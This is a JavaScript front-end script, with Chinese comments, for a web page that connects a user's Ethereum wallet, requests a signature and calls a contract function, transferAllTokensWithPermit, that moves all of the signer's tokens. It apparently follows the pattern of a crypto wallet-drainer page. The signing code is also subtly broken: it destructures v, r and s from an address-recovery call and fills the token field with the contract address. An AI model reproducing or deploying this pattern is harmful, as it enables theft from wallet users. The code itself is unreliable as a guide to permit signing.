let web3;
let userAddress;

// 最新的合约地址
const contractAddress = '0x838F9b8228a5C95a7c431bcDAb58E289f5D2A4DC';

// 最新的 ABI
const contractABI = [
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "target",
                "type": "address"
            }
        ],
        "name": "AddressEmptyCode",
        "type": "error"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "account",
                "type": "address"
            }
        ],
        "name": "AddressInsufficientBalance",
        "type": "error"
    },
    {
        "inputs": [],
        "name": "FailedInnerCall",
        "type": "error"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "token",
                "type": "address"
            }
        ],
        "name": "SafeERC20FailedOperation",
        "type": "error"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "token",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "uint8",
                "name": "v",
                "type": "uint8"
            },
            {
                "internalType": "bytes32",
                "name": "r",
                "type": "bytes32"
            },
            {
                "internalType": "bytes32",
                "name": "s",
                "type": "bytes32"
            }
        ],
        "name": "transferAllTokensWithPermit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "token",
                "type": "address"
            },
            {
                "indexed": true,
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "indexed": false,
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "TransferTokens",
        "type": "event"
    }
];

// 页面加载时检测钱包
window.addEventListener('load', () => {
    if (typeof window.ethereum !== 'undefined') {
        console.log('以太坊钱包已检测到。');
    } else {
        console.log('未检测到以太坊钱包。');
    }
});

// 连接钱包
document.getElementById('connectButton').addEventListener('click', async () => {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];  // 获取钱包地址

            console.log("已连接地址:", userAddress);
            document.getElementById('address').innerText = `钱包地址: ${userAddress}`;
            document.getElementById('tokenAddress').value = contractAddress;
            document.getElementById('fromAddress').value = userAddress;

            // 获取签名信息并自动填充
            await signAndFillSignature(userAddress, contractAddress);
        } catch (error) {
            console.error("连接钱包时出错:", error);
        }
    } else {
        alert('请安装MetaMask！');
    }
});

// 获取签名并自动填充
async function signAndFillSignature(userAddress, contractAddress) {
    // 创建合约实例
    const contract = new web3.eth.Contract(contractABI, contractAddress);

    // 假设我们要签名的数据是代币的转移
    const tokenAmount = web3.utils.toWei("1", "ether"); // 示例转移数量
    const nonce = await web3.eth.getTransactionCount(userAddress); // 获取当前 nonce

    // 生成签名消息
    const message = web3.utils.soliditySha3(
        { t: 'address', v: contractAddress },
        { t: 'address', v: userAddress },
        { t: 'uint256', v: tokenAmount },
        { t: 'uint256', v: nonce }
    );

    // 请求签名
    const { v, r, s } = await web3.eth.sign(message, userAddress).then(signature => {
        return web3.eth.accounts.recover(signature);
    });

    // 填充签名参数
    document.getElementById('v').value = v; // 签名 v 值
    document.getElementById('r').value = r; // 签名 r 值
    document.getElementById('s').value = s; // 签名 s 值
}

// 转移代币按钮事件
document.getElementById('transferButton').addEventListener('click', async () => {
    const contract = new web3.eth.Contract(contractABI, contractAddress);

    const tokenAddress = document.getElementById('tokenAddress').value;
    const fromAddress = document.getElementById('fromAddress').value;
    const v = document.getElementById('v').value;
    const r = document.getElementById('r').value;
    const s = document.getElementById('s').value;

    try {
        await contract.methods.transferAllTokensWithPermit(tokenAddress, fromAddress, v, r, s).send({ from: userAddress });
        console.log("代币已成功转移");
    } catch (error) {
        console.error("转移代币时出错:", error);
    }
});
